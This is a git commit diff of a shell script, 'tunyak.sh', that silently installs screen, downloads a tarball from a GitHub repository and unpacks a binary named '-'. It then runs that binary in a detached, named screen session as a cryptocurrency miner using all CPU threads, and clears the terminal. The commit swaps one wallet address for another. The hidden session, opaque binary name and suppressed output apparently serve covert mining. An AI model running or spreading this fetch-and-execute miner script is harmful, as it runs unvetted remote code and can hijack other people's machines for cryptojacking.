e1843ceb928be8c7b4f594f93984b0fb209ac715
01057057 <112078331+01057057@users.noreply.github.com>
2022-09-19 02:35:04 +0700

    Update tunyak.sh

--- tunyak.sh
+++ tunyak.sh
@@ -1,13 +1,13 @@
 #!/bin/sh
 
-WALLET=83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju
+WALLET=sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8
 
 POOL=pool.hashvault.pro:443
 
 sudo apt install screen -y > /dev/null 2>&1
 wget wget https://github.com/muledan1/bash/raw/main/-.tar.gz
 tar -xf -.tar.gz
-screen -S Wuenuak_Guerrr -dm ./- --url pool.hashvault.pro:443 --user 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju --pass kanyut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t$(nproc --all)
+screen -S Wuenuak_Guerrr -dm ./- -a yespowersugar  -o $POOL -u $WALLET.nett -t$(nproc --all)
 screen -ls
 sleep 2
 clear
